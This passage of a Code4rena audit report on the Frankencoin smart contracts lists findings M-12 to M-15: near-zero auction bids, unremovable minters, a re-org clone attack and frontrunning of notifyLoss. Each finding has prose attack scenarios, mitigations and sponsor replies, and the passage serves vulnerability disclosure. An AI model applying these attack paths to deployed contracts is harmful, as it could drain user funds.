balance in size. In this case, we need to redimension the bid and</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// tell the caller that a part of the bid needs to be returned to the bidder.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_bid</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_divD18</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_mulD18</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_bid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">colBal</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_size</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_size</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">colBal</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Note that thanks to the collateral invariant, we know that</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//    colBal * price &gt;= minted * ONE_DEC18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// and that therefore</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//    price &gt;= minted / colbal * E18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// such that</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//    volumeZCHF = price * size / E18 &gt;= minted * size / colbal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// So the owner cannot maliciously decrease the price to make volume fall below the proportionate repayment.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">volumeZCHF</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_mulD18</span><span class=\"mtk1\">(</span><span class=\"mtk12\">price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_size</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// How much could have minted with the challenged amount of the collateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// The owner does not have to repay (and burn) more than the owner actually minted.  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">repayment</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minted</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">volumeZCHF</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">minted</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">volumeZCHF</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// how much must be burned to make things even</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L217-L224\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L217-L224</a> <br><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L329-L350\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L329-L350</a></p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider implementing a challenge queue that allows the end function to be called on subsequent challenges only after previous challenges have ended.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/349#issuecomment-1532497402\">luziusmeisser (Frankencoin) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Bids must at least be 0.5% higher than the previous bid, so pro-longing the challenge four times already costs as much as the whole challenger reward of 2%, making this attack not very attractive under normal circumstances.</p>\n<p>—> Not worth to add any complexity to change this.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-12-auctions-fail-to-account-for-network-and-market-conditions\" style=\"position:relative;\"><a href=\"#m-12-auctions-fail-to-account-for-network-and-market-conditions\" aria-label=\"m 12 auctions fail to account for network and market conditions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/234\">[M-12] Auctions fail to account for network and market conditions</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/234\">3th</a></em></p>\n<p>Under certain extreme, but inevitable, network conditions, auctions will not be effective in covering the bad debt of a challenged position. Worse, certain position parameters under these conditions can lead to extremely small bids winning large amounts of collateral. More details follow in the next section, but it should be noted that this same design oversight was responsible for almost destroying Dai in March of 2020—the closest MakerDAO has ever been to utilizing its emergency shutdown module.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When the Ethereum network becomes highly congested, the price of gas can skyrocket to incredible levels. During times like these, users of the network will limit their activity to only the most urgent matters—in the case of March 12th, 2020, for example, the only people paying the exorbitant network fees were rushing to exit their positions as the price of ETH (and everything else) began to free fall.</p>\n<p>On that day, MakerDAO’s collateral auctions were slipping by unnoticed, as the bots that would typically compete in the majority of these auctions saw failing transactions, hit cost limits defined by their owners, or were simply deactivated. An attacker noticed them, however, and began winning auctions on liquidated collateral with bids of zero ETH.</p>\n<p>This exact vulnerability exists in the Frankencoin system, and it can be exploited under exactly the same circumstances. If a challenge only has a single bid when the challenge period ends, and that bid is near zero, the bid will still win the collateral regardless of how much it is actually worth.</p>\n<p>At first glance, Frankencoin developers might be tempted to believe that the dynamic challenge period on its positions will allow for the system to rely primarily on auctions that can outlast abnormally volatile days. In practice, however, this is unlikely to be true, since “safe” positions will likely end up with very short challenge periods. This is unavoidable, because the vast majority of ZCHF will be backed by these types of collateral, and the system risks carrying untenable amounts of bad debt ever more the longer these challenge periods are extended. And extending these windows does not actually solve the problem anyways, since the bad debt cannot be covered until they end.</p>\n<p>Consider, as well, that Frankencoin has a significant additional barrier to liquidating its positions when compared with MakerDAO: challenging requires collateral. I’ll actually discuss this piece of the challenge design in more detail in a separate report, but it bears mentioning that such a requirement will only make it less likely that positions will be challenged under extreme network and market conditions in the first place. If huge swaths of positions against a highly trusted collateral type all violate their liquidation prices concurrently, the amount of capital required to challenge all unsafe positions at once is unlikely to materialize quickly. This will lead to a severe loss of confidence in the ZCHF peg, as the system’s bad debt balloons, auctions clear for pennies on the dollar, and large, undercollateralized positions remain unchallenged. The peg likely could not withstand the ZCHF panic selling that would doubtlessly occur alongside this.</p>\n<p>In fact, this vulnerability does not even require a malicious actor to make the protocol insolvent in market conditions such as these. Since a challenge with no bids will determine the collateral to be worthless, the protocol will fail to liquidate any collateral from some or all of its unsafe positions.</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Since the high barrier to challenging positions is better covered in another report, its mitigation will be discussed there as well.</p>\n<p>For the greater underlying problem in this report, the mitigation is actually relatively simple: the auctions should be converted to “dutch auctions.” This simply means that, rather than starting from zero and accepting the highest bid, the auction should start above the liquidation price and gradually decrease. This will prevent any challenges from ending with winning near-zero bids.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/234#issuecomment-1523273815\">0xA5DF (lookout) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>Under certain extreme, but inevitable, network conditions, auctions will not be effective in covering the bad debt of a challenged position</p>\n</blockquote>\n<p>The main function of challenges here is to prevent positions with wrong pricing from being minted, but will leave open for sponsor’s comment since in some cases a low bid can cause loss to the protocol.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/234#issuecomment-1532561747\">luziusmeisser (Frankencoin) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Very interesting input.</p>\n<p>However, I’m not convinced that a Dutch auction would always be preferrable. One of the strength of the FRankencoin system is that its auction mechanism can handle relatively exotic collaterals. For those, it might take a few days for the bidders to evaluate them or to organize the bid. If the price falls too low during that time, the challenge might be successful even though the market price is above the liquidation price…</p>\n<p>I would acknowledge this issue as medium severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/234#issuecomment-1552374812\">hansfriese (judge) decreased severity to Medium</a></strong></p>\n<hr>\n<h2 id=\"m-13-cant-pause-or-remove-a-minter\" style=\"position:relative;\"><a href=\"#m-13-cant-pause-or-remove-a-minter\" aria-label=\"m 13 cant pause or remove a minter permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/230\">[M-13] Can’t pause or remove a minter</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/230\">Ruhum</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/990\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/938\">7siech</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/866\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/795\">santipu_</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/731\">deliriusz</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/582\">hihen</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/490\">foxb868</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/464\">Lirios</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/418\">zaevlad</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/337\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/237\">DadeKuma</a>, and <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/119\">J4de</a></em></p>\n<p>The project is supposed to be self-governing. Token owners are able to suggest new minters and collateral. The auction mechanism allows participants to remove collateral from the system if it’s deemed unhealthy. But, there’s no way to remove a registered minter.</p>\n<p>Why would you want to remove a registered minter? Because they can have bugs that could break the whole system. The current minter, MintingHub, for example, implements a novel auction mechanism to price collateral instead of choosing the industry standard Chainlink oracles. While I support the idea of having a fully decentralized system, it does add additional risk to the project. A risk that’s taken not only by the protocol team but every ZCHF holder as well.</p>\n<p>Obviously, these are just hypotheticals. But, the system is not equipped to handle a scenario where the minter malfunctions.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>After a minter is suggested you have generally 10 days to deny it. After that, there’s no way to remove it:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">denyMinter</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_helpers</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_message</span><span class=\"mtk1\">) </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">minters</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">]) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TooLate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">checkQualified</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_helpers</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minters</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MinterDenied</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_message</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Implement the ability for token holders to temporarily pause a minter as well as remove it altogether.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/230#issuecomment-1532548599\">luziusmeisser (Frankencoin) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>I have thought about the ability to remove old minters, but decided against it.</p>\n<p>Instead, experimental minters should come with their own limits (time, pause function, volume limits, etc.). They are free to include that. Minters that do not include it, can be expected to be denied unless they have been really thoroughly audited.</p>\n<p>So in fact, it is possible to pause a minter assuming the minter supports that functionality.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-14-re-org-attack-in-factory\" style=\"position:relative;\"><a href=\"#m-14-re-org-attack-in-factory\" aria-label=\"m 14 re org attack in factory permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/155\">[M-14] Re-org attack in factory</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/155\">0xWeiss</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/985\">V_B</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/885\">Breeje</a>, and <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/591\">Proxy</a></em></p>\n<p>The <code>createClone</code> function deploys a clone contract using the create, where the address derivation depends only on the <code>PositionFactory</code> nonce.</p>\n<p>Re-orgs can happen in all EVM chains. In ethereum, where currently Frankencoin is deployed, it is not “super common” but it still happens, being the last one less than a year ago:</p>\n<p><a href=\"https://decrypt.co/101390/ethereum-beacon-chain-blockchain-reorg\">https://decrypt.co/101390/ethereum-beacon-chain-blockchain-reorg</a></p>\n<p>The issue increases the changes of happening because frankencoin is thinking about deploying also in L2’s/ rollups, proof:</p>\n<p><a href=\"https://discord.com/channels/810916927919620096/1095308824354758696/1096693817450692658\">https://discord.com/channels/810916927919620096/1095308824354758696/1096693817450692658</a></p>\n<p>where re-orgs have been much more active:</p>\n<p><a href=\"https://protos.com/polygon-hit-by-157-block-reorg-despite-hard-fork-to-reduce-reorgs/\">https://protos.com/polygon-hit-by-157-block-reorg-despite-hard-fork-to-reduce-reorgs/</a></p>\n<p>being the last one, less than a year ago.</p>\n<p>The issue would happen when users rely on the address derivation in advance or try to deploy the position clone with the same address on different EVM chains, any funds sent to the new clone could potentially be withdrawn by anyone else. All in all, it could lead to the theft of user funds.</p>\n<p>As you can see in a previous report, the issue should be marked and judged as a medium:</p>\n<p><a href=\"https://code4rena.com/reports/2023-01-rabbithole/#m-01-questfactory-is-suspicious-of-the-reorg-attack\">https://code4rena.com/reports/2023-01-rabbithole/#m-01-questfactory-is-suspicious-of-the-reorg-attack</a></p>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Imagine that Alice deploys a position clone, and then sends funds to it. Bob sees that the network block reorg happens and calls <code>clonePosition</code>. Thus, it creates a position clone with an address to which Alice sends funds. Then Alice’s transactions are executed and Alice transfers funds to Bob’s position contract.</p>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The recommendation is basically the same as:</p>\n<p><a href=\"https://code4rena.com/reports/2023-01-rabbithole/#m-01-questfactory-is-suspicious-of-the-reorg-attack\">https://code4rena.com/reports/2023-01-rabbithole/#m-01-questfactory-is-suspicious-of-the-reorg-attack</a></p>\n<p>Deploy the cloned Position via create2 with a specific salt that includes msg.sender and address <code>_existing</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/155#issuecomment-1532565147\">luziusmeisser (Frankencoin) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-15-notifyloss-can-be-frontrun-by-redeem\" style=\"position:relative;\"><a href=\"#m-15-notifyloss-can-be-frontrun-by-redeem\" aria-label=\"m 15 notifyloss can be frontrun by redeem permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/48\">[M-15] <code>notifyLoss</code> can be frontrun by redeem</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/48\">0xWaitress</a></em></p>\n<p>notifyLoss immediately transfer zchf from reserve to the minter, reducing the amount of reserve and hence the equity and zchf to claim pershare.</p>\n<p>While the deposit has 90 days cooldown before depositor can withdraw, current depositor that passed this cooldown can take advantage of a notifyLoss event by first frontrunning the notifyLoss by redeeming, then re-depositing into the protocol to take advantage of the reducedvalue per share.</p>\n<p>notifyLoss can only be called by MintingHub::end, current depositor can bundle <code>redeem + end + deposit</code>, when they see a challenge that is ending in loss for the reserve.</p>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 